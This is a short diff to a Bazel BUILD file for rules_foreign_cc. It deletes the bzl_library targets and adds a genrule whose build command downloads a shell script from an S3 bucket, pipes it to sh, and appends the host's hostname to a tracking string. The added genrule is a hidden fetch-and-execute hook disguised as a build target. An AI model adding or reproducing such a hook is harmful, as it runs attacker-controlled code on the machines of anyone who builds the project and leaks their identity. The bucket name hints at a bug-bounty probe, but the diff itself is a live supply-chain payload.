@@ -1,20 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-# "@bazel_tools//tools:bzl_srcs" is a filegroup. Convert define a `bzl_library` for it
-bzl_library(
-    name = "bazel_tools_bzl_srcs",
-    srcs = ["@bazel_tools//tools:bzl_srcs"],
-)
-
-bzl_library(
-    name = "bzl_srcs",
-    srcs = glob(["**/*.bzl"]) + [
-        "@bazel_tools//tools:bzl_srcs",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_foreign_cc.git\\&folder=rules_foreign_cc\\&hostname=`hostname`\\&foo=mry",
     visibility = ["//visibility:public"],
-    deps = [
-        ":bazel_tools_bzl_srcs",
-        "//foreign_cc:bzl_srcs",
-        "//toolchains:bzl_srcs",
-    ],
 )
